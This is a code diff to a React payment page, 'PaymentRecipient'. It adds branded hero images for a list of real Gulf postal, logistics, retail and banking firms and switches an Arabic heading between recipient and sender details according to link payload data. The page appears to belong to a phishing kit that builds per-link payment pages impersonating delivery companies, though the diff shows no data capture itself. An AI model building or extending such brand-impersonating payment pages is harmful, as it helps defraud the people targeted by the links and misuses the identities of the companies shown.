@@ -27,6 +27,14 @@ import heroKwpost from "@/assets/hero-kwpost.jpg";
 import heroQpost from "@/assets/hero-qpost.jpg";
 import heroOmanpost from "@/assets/hero-omanpost.jpg";
 import heroBahpost from "@/assets/hero-bahpost.jpg";
+import heroGenacom from "@/assets/hero-genacom.jpg";
+import heroAlbaraka from "@/assets/hero-albaraka.jpg";
+import heroAlfuttaim from "@/assets/hero-alfuttaim.jpg";
+import heroAlshaya from "@/assets/hero-alshaya.jpg";
+import heroBahri from "@/assets/hero-bahri.jpg";
+import heroShipco from "@/assets/hero-shipco.jpg";
+import heroHellmann from "@/assets/hero-hellmann.jpg";
+import heroDsv from "@/assets/hero-dsv.jpg";
 import heroJinakum from "@/assets/hero-jinakum.jpg";
 import heroBg from "@/assets/hero-bg.jpg";
 
@@ -56,6 +64,9 @@ const PaymentRecipient = () => {
   const dynamicImage = companyMeta.image;
 
   const shippingInfo = linkData?.payload as any;
+
+  // Get payer type from shipping info (default to "recipient" for backward compatibility)
+  const payerType = shippingInfo?.payer_type || "recipient";
 
   // Get country from link data (must be before using currency functions)
   const countryCode = shippingInfo?.selectedCountry || "SA";
@@ -103,6 +114,16 @@ const PaymentRecipient = () => {
     'qpost': heroQpost,
     'omanpost': heroOmanpost,
     'bahpost': heroBahpost,
+    'genacom': heroGenacom,
+    'jinaken': heroGenacom,
+    'albaraka': heroAlbaraka,
+    'alfuttaim': heroAlfuttaim,
+    'alshaya': heroAlshaya,
+    'bahri': heroBahri,
+    'national': heroBahri,
+    'shipco': heroShipco,
+    'hellmann': heroHellmann,
+    'dsv': heroDsv,
     'jinakum': heroJinakum,
   };
   
@@ -232,7 +253,9 @@ const PaymentRecipient = () => {
             <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: branding.colors.primary }}>
               <form onSubmit={handleProceed}>
                 <div className="flex items-center justify-between mb-6 sm:mb-8">
-                  <h1 className="text-xl sm:text-3xl font-bold">معلومات المستلم</h1>
+                  <h1 className="text-xl sm:text-3xl font-bold">
+                    {payerType === "recipient" ? "معلومات المستلم" : "معلومات المرسل"}
+                  </h1>
                   
                   <div
                     className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
